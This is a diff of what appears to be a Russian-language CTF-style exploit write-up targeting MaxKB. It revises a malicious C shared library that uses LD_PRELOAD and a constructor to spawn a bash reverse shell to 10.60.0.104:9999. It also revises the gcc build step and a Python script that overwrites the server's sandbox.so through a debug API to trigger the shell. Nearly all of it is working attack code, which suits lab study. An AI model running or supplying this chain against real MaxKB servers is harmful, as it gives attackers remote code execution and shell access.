@@ -21,24 +21,21 @@ COPY flag /root/flag
 #include <string.h>
 
 void payload() {
+    unsetenv("LD_PRELOAD");
     system("bash -c 'bash -i >& /dev/tcp/10.60.0.104/9999 0>&1'");
 }
 
-int strncmp(const char* __s1, const char* __s2, size_t __n) {
-    if (getenv("LD_PRELOAD") == NULL) {
-        return 0;
+__attribute__((constructor))
+void init() {
+    if (getenv("LD_PRELOAD") != NULL) {
+        payload();
     }
-    unsetenv("LD_PRELOAD");
-    payload();
-
-    return 0;
 }
 ```
 
 ### Собираем бинарь:
 ```
-gcc -c -fPIC ls_sandbox.c
-gcc -shared -o ls_sandbox.so ls_sandbox.o
+gcc -shared -fPIC -o ls_sandbox.so ls_sandbox.c
 ```
 
 ### Загружкаем `ls_sandbox.so` на сервер с MaxKB и пытаемся его вызвать:
@@ -116,10 +113,10 @@ def execute_python_code(code):
         return f"Exception: {e}"
 
 
-def ls_for_rev_shell():
+def rev_shell():
     """Выполнение ls через Python"""
     code = """import os
-os.popen("ls")"""
+os.popen("")"""
 
     return execute_python_code(code)
 
@@ -148,9 +145,6 @@ def write_remote_file(remote_path, b64_content, mode="wb"):
     return execute_python_code(code)
 
 def main():
-    print("=" * 60)
-    print("MaxKB RCE Exploit - Complete Attack Chain")
-    print("=" * 60)
     print(f"[+] Target: {TARGET_URL}")
     print(f"[+] Username: {USERNAME}")
     print(f"[+] Exploit endpoint: {TOOL_DEBUG_API}")
@@ -173,7 +167,7 @@ def main():
     # Перезапись sandbox.so
     print("\n[+] Step 3: Remote sandbox.so Write")
     test_path = "/opt/maxkb-app/sandbox/sandbox.so"
-    with open("ls_sandbox.so", "rb") as f:
+    with open("new_sandbox.so", "rb") as f:
         raw = f.read()
 
     print(raw)
@@ -183,8 +177,8 @@ def main():
     print(f"[Write Result] {result}")
 
     # Вызываем ls
-    print("\n[*] Execut 'ls' For reverse shell:")
-    read_back = ls_for_rev_shell()
+    print("\n[*] Make reverse shell:")
+    read_back = rev_shell()
 
 if __name__ == "__main__":
     main()
